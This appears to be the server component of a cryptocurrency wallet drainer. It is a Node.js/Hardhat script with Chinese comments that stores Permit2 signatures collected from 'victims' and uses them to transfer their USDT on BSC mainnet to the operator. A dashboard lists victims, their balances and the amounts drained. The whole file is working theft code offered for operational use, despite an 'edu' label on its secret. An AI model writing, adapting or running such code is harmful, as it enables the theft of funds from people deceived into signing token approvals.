// sweep-server.js — Permit2 手动 sweep + 监控面板
// 启动: npx hardhat run scripts/sweep-server.js --network bscMainnet

const http = require("http");
const { ethers } = require("hardhat");

const PORT = 3999;
const SECRET = "edu-sweep-2026";

const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const USDT = "0x55d398326f99059fF775485246999027B3197955";

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
];

const PERMIT2_ABI = [
  "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external",
  "function transferFrom(address from, address to, uint160 amount, address token) external",
];

// 存储待收割的受害者: { victim: { permitData, signature, storedAt, balance } }
const pendingVictims = new Map();

function splitSignature(sig) {
  const s = ethers.Signature.from(sig);
  return { r: s.r, s: s.s, v: s.v };
}

async function doPermit2Sweep(victim, permitData, signature) {
  const [signer] = await ethers.getSigners();
  const me = signer.address;
  const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, signer);
  const token = new ethers.Contract(USDT, ERC20_ABI, signer);

  const bal = await token.balanceOf(victim);
  if (bal === 0n) return { ok: false, msg: "余额为 0", victim };

  try {
    console.log(`[sweep] ${victim} permit...`);
    const sig = splitSignature(signature);
    const tx1 = await permit2.permit(victim, permitData, ethers.Signature.from({ r: sig.r, s: sig.s, v: sig.v }).serialized);
    await tx1.wait();
    console.log(`[sweep] permit ok: ${tx1.hash.slice(0,16)}...`);

    const drainedAmount = bal > 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFn
      ? "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF" : bal.toString();
    const tx2 = await permit2.transferFrom(victim, me, drainedAmount, USDT);
    await tx2.wait();
    console.log(`[sweep] transferFrom ok: ${tx2.hash.slice(0,16)}...`);

    const newBal = await token.balanceOf(victim);
    const drained = ethers.formatUnits(bal - newBal, 18);
    pendingVictims.set(victim.toLowerCase(), { status: "swept", drained, txHash: tx2.hash });
    return { ok: true, victim, drained, txHash: tx2.hash };
  } catch (e) {
    return { ok: false, msg: e.shortMessage || e.message, victim };
  }
}

async function getVictims() {
  const provider = ethers.provider;
  const [signer] = await ethers.getSigners();
  const token = new ethers.Contract(USDT, ERC20_ABI, provider);

  const victims = [];
  for (const [addr, data] of pendingVictims) {
    try {
      const bal = await token.balanceOf(addr);
      const sweepable = data.status !== "swept" && bal > 0n;
      victims.push({
        address: addr,
        balance: ethers.formatUnits(bal, 18),
        sweepable,
        status: data.status === "swept" ? "swept" : (sweepable ? "ready" : "pending"),
        storedAt: data.storedAt || "",
        txHash: data.txHash || "",
        drained: data.drained || "",
      });
    } catch (e) { /* skip */ }
  }
  victims.sort((a, b) => parseFloat(b.balance) - parseFloat(a.balance));
  const totalRemaining = victims.filter(v => v.sweepable).reduce((s, v) => s + parseFloat(v.balance), 0);

  return {
    operator: signer.address,
    totalVictims: victims.length,
    readyCount: victims.filter(v => v.sweepable).length,
    sweptCount: victims.filter(v => v.status === "swept").length,
    pendingCount: victims.filter(v => v.status === "pending").length,
    totalRemaining: totalRemaining.toFixed(4),
    victims,
  };
}

const server = http.createServer(async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") { res.writeHead(204); res.end(); return; }

  // 存储（不自动 sweep）
  if (req.method === "POST" && req.url === "/store") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const data = JSON.parse(body);
        if (data.secret !== SECRET) { res.writeHead(403); res.end(JSON.stringify({ ok: false, msg: "forbidden" })); return; }
        const key = data.victim.toLowerCase();
        pendingVictims.set(key, {
          permitData: data.permit,
          signature: data.signature,
          storedAt: new Date().toISOString(),
          status: "pending",
        });
        console.log(`[store] ${data.victim} — waiting for manual sweep`);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ ok: true, msg: "stored", victim: data.victim }));
      } catch (e) {
        res.writeHead(500);
        res.end(JSON.stringify({ ok: false, msg: e.message }));
      }
    });
    return;
  }

  // 手动 sweep
  if (req.method === "POST" && req.url === "/permit2-sweep") {
    let body = "";
    req.on("data", (chunk) => (body += chunk));
    req.on("end", async () => {
      try {
        const data = JSON.parse(body);
        if (data.secret !== SECRET) { res.writeHead(403); res.end(JSON.stringify({ ok: false, msg: "forbidden" })); return; }
        const key = data.victim.toLowerCase();
        const stored = pendingVictims.get(key);
        if (!stored || !stored.permitData) {
          res.writeHead(400);
          res.end(JSON.stringify({ ok: false, msg: "未找到该地址的授权数据" }));
          return;
        }
        const result = await doPermit2Sweep(data.victim, stored.permitData, stored.signature);
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify(result));
      } catch (e) {
        res.writeHead(500);
        res.end(JSON.stringify({ ok: false, msg: e.message }));
      }
    });
    return;
  }

  if (req.method === "GET" && req.url.startsWith("/monitor")) {
    try {
      const data = await getVictims();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(data));
    } catch (e) {
      res.writeHead(500);
      res.end(JSON.stringify({ ok: false, msg: e.message }));
    }
    return;
  }

  if (req.method === "GET" && req.url === "/health") { res.writeHead(200); res.end("OK"); return; }
  res.writeHead(404); res.end("not found");
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`Permit2 Sweep Server on port ${PORT}`);
  console.log(`GET  /monitor       — 查看待收割列表`);
  console.log(`POST /store         — 存储授权（不自动 sweep）`);
  console.log(`POST /permit2-sweep — 手动 sweep`);
});
